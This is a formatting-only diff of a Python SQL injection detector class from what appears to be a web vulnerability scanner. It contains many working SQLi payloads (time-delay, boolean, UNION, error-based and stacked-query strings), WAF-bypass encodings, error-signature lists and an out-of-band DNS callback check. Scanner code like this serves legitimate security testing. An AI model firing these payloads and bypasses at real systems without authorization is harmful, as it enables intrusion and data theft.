@@ -8,7 +8,6 @@ Five engines beyond basic query-param injection:
   5. Polymorphic WAF Encodings       (versioned comments, hex strings, HPP, %0a/%09 WS)
 """
 
-
 from __future__ import annotations
 
 import asyncio
@@ -33,41 +32,83 @@ logger = get_logger("detector")
 # ---------------------------------------------------------------------------
 _SQLI_ERROR_SIGNATURES: tuple[str, ...] = (
     # Generic / standards
-    "sql syntax", "syntax error", "sqlstate", "database error", "query failed",
-    "unclosed quotation mark", "quoted string not properly terminated", "conversion failed",
+    "sql syntax",
+    "syntax error",
+    "sqlstate",
+    "database error",
+    "query failed",
+    "unclosed quotation mark",
+    "quoted string not properly terminated",
+    "conversion failed",
     # MySQL / MariaDB
-    "mysql_fetch_array", "warning: mysql", "com.mysql.jdbc", "mariadb",
+    "mysql_fetch_array",
+    "warning: mysql",
+    "com.mysql.jdbc",
+    "mariadb",
     "you have an error in your sql syntax",
     "check the manual that corresponds to your mysql server version",
-    "extractvalue", "updatexml",
+    "extractvalue",
+    "updatexml",
     # PostgreSQL
-    "postgresql", "pg_query", "org.postgresql", "pg_exec",
-    "syntax error at or near", "invalid input syntax for",
-    "relation does not exist", "column does not exist",
+    "postgresql",
+    "pg_query",
+    "org.postgresql",
+    "pg_exec",
+    "syntax error at or near",
+    "invalid input syntax for",
+    "relation does not exist",
+    "column does not exist",
     # Microsoft SQL Server
-    "incorrect syntax near", "microsoft ole db", "microsoft sql server",
-    "odbc driver", "driver [{",
+    "incorrect syntax near",
+    "microsoft ole db",
+    "microsoft sql server",
+    "odbc driver",
+    "driver [{",
     "unclosed quotation mark after the character string",
     "cannot resolve collation",
     # SQLite
-    "sqlite3.operationalerror", "sqlite_step", "sqlite3.databaseerror",
-    "no such column", "no such table",
+    "sqlite3.operationalerror",
+    "sqlite_step",
+    "sqlite3.databaseerror",
+    "no such column",
+    "no such table",
     # Oracle
-    "ora-00933", "ora-00921", "ora-00936", "ora-01756", "ora-00904", "ora-01403", "ora-",
+    "ora-00933",
+    "ora-00921",
+    "ora-00936",
+    "ora-01756",
+    "ora-00904",
+    "ora-01403",
+    "ora-",
     # IBM DB2, Informix, Sybase, H2, CockroachDB, Hibernate
-    "db2 sql error", "sybase", "informix", "org.h2.jdbc", "cockroachdb", "org.hibernate",
+    "db2 sql error",
+    "sybase",
+    "informix",
+    "org.h2.jdbc",
+    "cockroachdb",
+    "org.hibernate",
     # Firebird
-    "firebird", "gds", "dynamic sql error", "sql error code",
+    "firebird",
+    "gds",
+    "dynamic sql error",
+    "sql error code",
     # Ingres
-    "ingres", "ingres sqlstate",
+    "ingres",
+    "ingres sqlstate",
     # Neo4j
-    "neo4j", "neo.ClientError", "cypher",
+    "neo4j",
+    "neo.ClientError",
+    "cypher",
     # SAP HANA
-    "sap hana", "hdb", "sql error:",
+    "sap hana",
+    "hdb",
+    "sql error:",
     # Vertica
-    "vertica", "hsql",
+    "vertica",
+    "hsql",
     # Snowflake
-    "snowflake", "snowflake.Error",
+    "snowflake",
+    "snowflake.Error",
 )
 
 # HTTP headers that are commonly logged/stored as-is and executed raw SQL
@@ -154,34 +195,39 @@ class SQLiDetector:
         base_payloads = self.payload_smith.get_base_payloads("sqli", context_data)
 
         # Multi-dialect timing payloads
-        base_payloads.extend([
-            "' AND SLEEP(3)--", "' OR SLEEP(3)--", "1' AND SLEEP(3)--",
-            "' AND pg_sleep(3)--", "1' AND pg_sleep(3)--",
-            "'; WAITFOR DELAY '0:0:3'--",
-            "' AND BENCHMARK(5000000, MD5('x'))--",
-            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
-            "' AND RANDOMBLOB(500000000)--",
-            "' AND 1=DBMS_LOCK.SLEEP(3)--",
-            "SELECT PG_SLEEP(3)--",
-            "' AND 1=CRYPTO_KEY(3)--",
-        ])
+        base_payloads.extend(
+            [
+                "' AND SLEEP(3)--",
+                "' OR SLEEP(3)--",
+                "1' AND SLEEP(3)--",
+                "' AND pg_sleep(3)--",
+                "1' AND pg_sleep(3)--",
+                "'; WAITFOR DELAY '0:0:3'--",
+                "' AND BENCHMARK(5000000, MD5('x'))--",
+                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
+                "' AND RANDOMBLOB(500000000)--",
+                "' AND 1=DBMS_LOCK.SLEEP(3)--",
+                "SELECT PG_SLEEP(3)--",
+                "' AND 1=CRYPTO_KEY(3)--",
+            ]
+        )
 
         # WAF detection + bypass payloads
-        waf = (
-            self.payload_smith.detect_waf({}, "", 0)
-            or self.fingerprint.get("waf", "unknown")
-        )
+        waf = self.payload_smith.detect_waf({}, "", 0) or self.fingerprint.get("waf", "unknown")
         if waf and waf != "unknown":
-            base_payloads.extend(
-                self.payload_smith.get_waf_bypass_payloads(base_payloads[:5], waf)
-            )
+            base_payloads.extend(self.payload_smith.get_waf_bypass_payloads(base_payloads[:5], waf))
 
         # Comment-token WAF bypasses
-        base_payloads.extend([
-            "' OR/**/1=1--", "'/**/OR/**/1=1--",
-            "1'/**/AND/**/SLEEP(3)--", "1'/**/AND/**/pg_sleep(3)--",
-            "'/**/AND/**/pg_sleep(3)--", "';/**/WAITFOR/**/DELAY/**/'0:0:3'--",
-        ])
+        base_payloads.extend(
+            [
+                "' OR/**/1=1--",
+                "'/**/OR/**/1=1--",
+                "1'/**/AND/**/SLEEP(3)--",
+                "1'/**/AND/**/pg_sleep(3)--",
+                "'/**/AND/**/pg_sleep(3)--",
+                "';/**/WAITFOR/**/DELAY/**/'0:0:3'--",
+            ]
+        )
 
         # Engine-5: Polymorphic WAF encodings
         base_payloads.extend(self._build_waf_polymorphic_set())
@@ -211,9 +257,7 @@ class SQLiDetector:
 
         # ── Engine 5: Dynamic Union column bisection (if param hit found) ─
         if findings:
-            col_findings = await self._scan_union_bisect(
-                context, target, method, url, params, findings[0]
-            )
+            col_findings = await self._scan_union_bisect(context, target, method, url, params, findings[0])
             findings.extend(col_findings)
 
         return findings
@@ -233,11 +277,13 @@ class SQLiDetector:
         payloads: list[str] = []
 
         # MySQL versioned inline comments
-        payloads.extend([
-            "'/*!50000OR*//*!50000 1*/=1--",
-            "'/*!50000UNION*//*!50000SELECT*/NULL--",
-            "' /*!50000AND*/ SLEEP(3)--",
-        ])
+        payloads.extend(
+            [
+                "'/*!50000OR*//*!50000 1*/=1--",
+                "'/*!50000UNION*//*!50000SELECT*/NULL--",
+                "' /*!50000AND*/ SLEEP(3)--",
+            ]
+        )
 
         # Whitespace substitution (hex-encoded in URL context — many WAFs only
         # strip ASCII 0x20; tab 0x09 and newline 0x0a are invisible to simple regex)
@@ -247,17 +293,21 @@ class SQLiDetector:
 
         # Quote-less payloads via CHAR() — bypasses addslashes() quote filters
         # CHAR(39) = ' (single quote)  CHAR(49,61,49) = '1=1'
-        payloads.extend([
-            "' OR CHAR(49)=CHAR(49)--",
-            "' AND 1=CHAR(49)--",
-            "' UNION SELECT CONCAT(CHAR(115,113,108,105),version())--",
-        ])
+        payloads.extend(
+            [
+                "' OR CHAR(49)=CHAR(49)--",
+                "' AND 1=CHAR(49)--",
+                "' UNION SELECT CONCAT(CHAR(115,113,108,105),version())--",
+            ]
+        )
 
         # Double-encode critical characters for WAFs that only decode once
-        payloads.extend([
-            "%27%20OR%201%3D1--",       # ' OR 1=1--
-            "%27%20AND%201%3D2--",      # ' AND 1=2--
-        ])
+        payloads.extend(
+            [
+                "%27%20OR%201%3D1--",  # ' OR 1=1--
+                "%27%20AND%201%3D2--",  # ' AND 1=2--
+            ]
+        )
 
         return payloads
 
@@ -265,9 +315,7 @@ class SQLiDetector:
     # ENGINE 1 — CONTEXT-AWARE PARAM PAYLOAD SUITE
     # ------------------------------------------------------------------
 
-    def _build_param_payload_suite(
-        self, param_name: str, param_val: str, generic_payloads: list[str]
-    ) -> list[str]:
+    def _build_param_payload_suite(self, param_name: str, param_val: str, generic_payloads: list[str]) -> list[str]:
         suite = list(generic_payloads)
 
         # Integer context: unquoted arithmetic + delay probes
@@ -282,13 +330,20 @@ class SQLiDetector:
             ]
 
         # Quoted string contexts: single, double, nested parentheses
-        suite.extend([
-            "' OR '1'='1", "' AND '1'='2",
-            '" OR "1"="1', '" AND "1"="2',
-            "') OR ('1'='1", "') AND ('1'='2",
-            "')) OR (('1'='1", "')) AND (('1'='2",
-            "') OR 1=1--", "')) OR 1=1--",
-        ])
+        suite.extend(
+            [
+                "' OR '1'='1",
+                "' AND '1'='2",
+                '" OR "1"="1',
+                '" AND "1"="2',
+                "') OR ('1'='1",
+                "') AND ('1'='2",
+                "')) OR (('1'='1",
+                "')) AND (('1'='2",
+                "') OR 1=1--",
+                "')) OR 1=1--",
+            ]
+        )
 
         # ORDER BY column stepper (1–10; binary search done in Engine 4)
         for n in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]:
@@ -300,15 +355,17 @@ class SQLiDetector:
             suite.append("' UNION SELECT " + ",".join(["NULL"] * n) + "--")
 
         # Error-based probes
-        suite.extend([
-            "' AND 1=CAST((SELECT version()) AS int)--",
-            "' AND 1=CONVERT(int, (SELECT @@version))--",
-            "' AND extractvalue(1, concat(0x7e,(SELECT version()),0x7e))--",
-            "' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--",
-            # Stacked queries (MySQL, MSSQL, PostgreSQL where allowed)
-            "'; SELECT 1--",
-            "'; INSERT INTO x VALUES(1)--",
-        ])
+        suite.extend(
+            [
+                "' AND 1=CAST((SELECT version()) AS int)--",
+                "' AND 1=CONVERT(int, (SELECT @@version))--",
+                "' AND extractvalue(1, concat(0x7e,(SELECT version()),0x7e))--",
+                "' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--",
+                # Stacked queries (MySQL, MSSQL, PostgreSQL where allowed)
+                "'; SELECT 1--",
+                "'; INSERT INTO x VALUES(1)--",
+            ]
+        )
 
         return list(dict.fromkeys(suite))
 
@@ -355,7 +412,9 @@ class SQLiDetector:
                     body = await resp.text()
 
                     diffs = BaselineAnalyzer.diff_responses(baseline_body, body, payload)
-                    has_error = any(s in body.lower() and s not in baseline_body.lower() for s in _SQLI_ERROR_SIGNATURES)
+                    has_error = any(
+                        s in body.lower() and s not in baseline_body.lower() for s in _SQLI_ERROR_SIGNATURES
+                    )
                     if has_error:
                         for sig in _SQLI_ERROR_SIGNATURES:
                             if sig in body.lower() and sig not in baseline_body.lower():
@@ -363,27 +422,29 @@ class SQLiDetector:
                                 break
 
                     if has_error or resp.status >= 500:
-                        findings.append(Finding(
-                            target=target,
-                            url=str(resp.url or url),
-                            method=method.upper(),
-                            param=header_name,
-                            location="header",
-                            payload=payload,
-                            attack_type=AttackType.SQLI,
-                            severity=Severity.HIGH,
-                            verified=has_error,
-                            confidence=0.75 if has_error else 0.40,
-                            status=resp.status,
-                            headers=dict(resp.headers),
-                            body=body[:2000],
-                            diffs=diffs,
-                            baseline_body=baseline_body[:2000],
-                            baseline_status=baseline_status,
-                            verification_body=body[:2000],
-                            verification_status=resp.status,
-                            metadata={"injection_location": "http_header"},
-                        ))
+                        findings.append(
+                            Finding(
+                                target=target,
+                                url=str(resp.url or url),
+                                method=method.upper(),
+                                param=header_name,
+                                location="header",
+                                payload=payload,
+                                attack_type=AttackType.SQLI,
+                                severity=Severity.HIGH,
+                                verified=has_error,
+                                confidence=0.75 if has_error else 0.40,
+                                status=resp.status,
+                                headers=dict(resp.headers),
+                                body=body[:2000],
+                                diffs=diffs,
+                                baseline_body=baseline_body[:2000],
+                                baseline_status=baseline_status,
+                                verification_body=body[:2000],
+                                verification_status=resp.status,
+                                metadata={"injection_location": "http_header"},
+                            )
+                        )
                         break  # First confirmed payload per header is enough
                 except Exception as exc:
                     logger.debug(f"variant failed, continuing: {exc}")
@@ -456,34 +517,38 @@ class SQLiDetector:
                     body = await resp.text()
 
                     diffs = BaselineAnalyzer.diff_responses(baseline_body, body, payload)
-                    has_error = any(s in body.lower() and s not in baseline_body.lower() for s in _SQLI_ERROR_SIGNATURES)
+                    has_error = any(
+                        s in body.lower() and s not in baseline_body.lower() for s in _SQLI_ERROR_SIGNATURES
+                    )
 
                     if has_error:
                         for sig in _SQLI_ERROR_SIGNATURES:
                             if sig in body.lower() and sig not in baseline_body.lower():
                                 diffs.append(f"error:{sig}")
                                 break
-                        findings.append(Finding(
-                            target=target,
-                            url=str(resp.url or url),
-                            method="POST",
-                            param=".".join(str(p) for p in path),
-                            location="json_body",
-                            payload=payload,
-                            attack_type=AttackType.SQLI,
-                            severity=Severity.HIGH,
-                            verified=True,
-                            confidence=0.82,
-                            status=resp.status,
-                            headers=dict(resp.headers),
-                            body=body[:2000],
-                            diffs=diffs,
-                            baseline_body=baseline_body[:2000],
-                            baseline_status=baseline_status,
-                            verification_body=body[:2000],
-                            verification_status=resp.status,
-                            metadata={"injection_location": "json_ast", "json_path": path},
-                        ))
+                        findings.append(
+                            Finding(
+                                target=target,
+                                url=str(resp.url or url),
+                                method="POST",
+                                param=".".join(str(p) for p in path),
+                                location="json_body",
+                                payload=payload,
+                                attack_type=AttackType.SQLI,
+                                severity=Severity.HIGH,
+                                verified=True,
+                                confidence=0.82,
+                                status=resp.status,
+                                headers=dict(resp.headers),
+                                body=body[:2000],
+                                diffs=diffs,
+                                baseline_body=baseline_body[:2000],
+                                baseline_status=baseline_status,
+                                verification_body=body[:2000],
+                                verification_status=resp.status,
+                                metadata={"injection_location": "json_ast", "json_path": path},
+                            )
+                        )
                         break
                 except Exception as exc:
                     logger.debug(f"variant failed, continuing: {exc}")
@@ -531,6 +596,7 @@ class SQLiDetector:
         findings: list[Finding] = []
         try:
             from titan.integrations.interactsh import InteractshClient
+
             client = InteractshClient()
             registered = await client.register()
             if not registered:
@@ -563,25 +629,27 @@ class SQLiDetector:
             interactions = []
 
         if interactions:
-            findings.append(Finding(
-                target=target,
-                url=url,
-                method=method.upper(),
-                param="oob_callback",
-                location="oob",
-                payload=f"oob_domain={domain}",
-                attack_type=AttackType.SQLI,
-                severity=Severity.CRITICAL,
-                verified=True,
-                confidence=0.95,
-                status=None,
-                diffs=[f"oob_interaction:{i.get('protocol','dns')}" for i in interactions[:3]],
-                metadata={
-                    "oob_domain": domain,
-                    "interactions": interactions[:5],
-                    "injection_location": "oob_dns",
-                },
-            ))
+            findings.append(
+                Finding(
+                    target=target,
+                    url=url,
+                    method=method.upper(),
+                    param="oob_callback",
+                    location="oob",
+                    payload=f"oob_domain={domain}",
+                    attack_type=AttackType.SQLI,
+                    severity=Severity.CRITICAL,
+                    verified=True,
+                    confidence=0.95,
+                    status=None,
+                    diffs=[f"oob_interaction:{i.get('protocol', 'dns')}" for i in interactions[:3]],
+                    metadata={
+                        "oob_domain": domain,
+                        "interactions": interactions[:5],
+                        "injection_location": "oob_dns",
+                    },
+                )
+            )
 
         try:
             await client.deregister()
@@ -620,9 +688,7 @@ class SQLiDetector:
             return findings
 
         # Step 2: Find string-accepting columns
-        string_cols = await self._probe_string_columns(
-            context, url, method, params, param_name, col_count
-        )
+        string_cols = await self._probe_string_columns(context, url, method, params, param_name, col_count)
 
         if string_cols:
             marker = "TITAN" + "".join(random.choices(string.ascii_uppercase, k=6))
@@ -641,29 +707,31 @@ class SQLiDetector:
                 body = await resp.text()
 
                 if marker in body:
-                    findings.append(Finding(
-                        target=target,
-                        url=str(resp.url or url),
-                        method=method.upper(),
-                        param=param_name,
-                        location="query" if method == "GET" else "body",
-                        payload=union_payload,
-                        attack_type=AttackType.SQLI,
-                        severity=Severity.CRITICAL,
-                        verified=True,
-                        confidence=0.98,
-                        status=resp.status,
-                        headers=dict(resp.headers),
-                        body=body[:2000],
-                        diffs=[f"union_marker_reflected:{marker}", f"union_cols:{col_count}"],
-                        verification_body=body[:2000],
-                        verification_status=resp.status,
-                        metadata={
-                            "column_count": col_count,
-                            "string_columns": string_cols,
-                            "injection_location": "union_bisect",
-                        },
-                    ))
+                    findings.append(
+                        Finding(
+                            target=target,
+                            url=str(resp.url or url),
+                            method=method.upper(),
+                            param=param_name,
+                            location="query" if method == "GET" else "body",
+                            payload=union_payload,
+                            attack_type=AttackType.SQLI,
+                            severity=Severity.CRITICAL,
+                            verified=True,
+                            confidence=0.98,
+                            status=resp.status,
+                            headers=dict(resp.headers),
+                            body=body[:2000],
+                            diffs=[f"union_marker_reflected:{marker}", f"union_cols:{col_count}"],
+                            verification_body=body[:2000],
+                            verification_status=resp.status,
+                            metadata={
+                                "column_count": col_count,
+                                "string_columns": string_cols,
+                                "injection_location": "union_bisect",
+                            },
+                        )
+                    )
             except Exception as exc:
                 logger.debug(f"suppressed exception: {exc}")
                 pass
@@ -807,38 +875,79 @@ class SQLiDetector:
                     test_params = dict(all_params)
                     test_params[param_name] = payload
                     if method == "GET":
-                        resp = await context.request.get(url, params=test_params, headers={"Referer": target}, timeout=3000)
+                        resp = await context.request.get(
+                            url, params=test_params, headers={"Referer": target}, timeout=3000
+                        )
                     else:
-                        resp = await context.request.post(url, data=test_params, headers={"Referer": target}, timeout=3000)
+                        resp = await context.request.post(
+                            url, data=test_params, headers={"Referer": target}, timeout=3000
+                        )
                     body = await resp.text()
 
                     diffs = BaselineAnalyzer.diff_responses(baseline_body, body, payload)
 
                     # 3. Timing Oracle (Blind SQLi)
                     is_blind, blind_time = False, 0.0
-                    delay_keywords = ["sleep(", "sleep ", "benchmark(", "waitfor", "pg_sleep", "dbms_pipe", "randomblob("]
+                    delay_keywords = [
+                        "sleep(",
+                        "sleep ",
+                        "benchmark(",
+                        "waitfor",
+                        "pg_sleep",
+                        "dbms_pipe",
+                        "randomblob(",
+                    ]
                     if timing_runs < 3 and any(k in payload.lower() for k in delay_keywords):
                         timing_runs += 1
                         is_blind, blind_time = await self.blind_detector.detect_time_based(
-                            context, url, method, test_params, {}, {"Referer": target},
-                            payload, "query" if method == "GET" else "body",
-                            baseline_times, param_name=param_name,
+                            context,
+                            url,
+                            method,
+                            test_params,
+                            {},
+                            {"Referer": target},
+                            payload,
+                            "query" if method == "GET" else "body",
+                            baseline_times,
+                            param_name=param_name,
                         )
                     if is_blind:
                         diffs.append(f"time_delay:{blind_time:.1f}s")
 
                     # 4. Error-Based Oracle
                     error_signatures = [
-                        "sql syntax", "mysql_fetch_array", "ora-", "postgresql",
-                        "warning: mysql", "syntax error", "sqlstate", "odbc driver",
-                        "unclosed quotation mark", "quoted string not properly terminated",
-                        "incorrect syntax near", "microsoft ole db",
-                        "sqlite3.operationalerror", "database error",
-                        "syntax error at or near", "conversion failed",
-                        "query failed", "db2 sql error",
-                        "pg_query", "org.hibernate", "org.postgresql", "com.mysql.jdbc",
-                        "microsoft sql server", "sqlite_step", "driver [{", "sybase", "informix",
-                        "ora-00933", "ora-00921", "ora-00936", "ora-01756", "ora-00904",
+                        "sql syntax",
+                        "mysql_fetch_array",
+                        "ora-",
+                        "postgresql",
+                        "warning: mysql",
+                        "syntax error",
+                        "sqlstate",
+                        "odbc driver",
+                        "unclosed quotation mark",
+                        "quoted string not properly terminated",
+                        "incorrect syntax near",
+                        "microsoft ole db",
+                        "sqlite3.operationalerror",
+                        "database error",
+                        "syntax error at or near",
+                        "conversion failed",
+                        "query failed",
+                        "db2 sql error",
+                        "pg_query",
+                        "org.hibernate",
+                        "org.postgresql",
+                        "com.mysql.jdbc",
+                        "microsoft sql server",
+                        "sqlite_step",
+                        "driver [{",
+                        "sybase",
+                        "informix",
+                        "ora-00933",
+                        "ora-00921",
+                        "ora-00936",
+                        "ora-01756",
+                        "ora-00904",
                     ]
                     for sig in error_signatures:
                         if sig in body.lower() and sig not in baseline_body.lower():
@@ -847,15 +956,25 @@ class SQLiDetector:
 
                     # 5. Sanity-Pair Boolean Oracle
                     sanity_confirmed = False
-                    if "'" in payload.lower() or "1=1" in payload.lower() or "or" in payload.lower() or "union" in payload.lower() or "order by" in payload.lower():
+                    if (
+                        "'" in payload.lower()
+                        or "1=1" in payload.lower()
+                        or "or" in payload.lower()
+                        or "union" in payload.lower()
+                        or "order by" in payload.lower()
+                    ):
                         opposite = self._get_opposite_payload(payload)
                         if opposite:
                             opp_params = dict(all_params)
                             opp_params[param_name] = opposite
                             if method == "GET":
-                                opp_resp = await context.request.get(url, params=opp_params, headers={"Referer": target}, timeout=3000)
+                                opp_resp = await context.request.get(
+                                    url, params=opp_params, headers={"Referer": target}, timeout=3000
+                                )
                             else:
-                                opp_resp = await context.request.post(url, data=opp_params, headers={"Referer": target}, timeout=3000)
+                                opp_resp = await context.request.post(
+                                    url, data=opp_params, headers={"Referer": target}, timeout=3000
+                                )
                             opp_body = await opp_resp.text()
 
                             if not is_echo_differential(body, opp_body, payload, opposite):
@@ -946,5 +1065,3 @@ class SQLiDetector:
         if "order by" in pl:
             return payload.replace("ORDER BY 1", "ORDER BY 99999").replace("order by 1", "ORDER BY 99999")
         return None
-
-
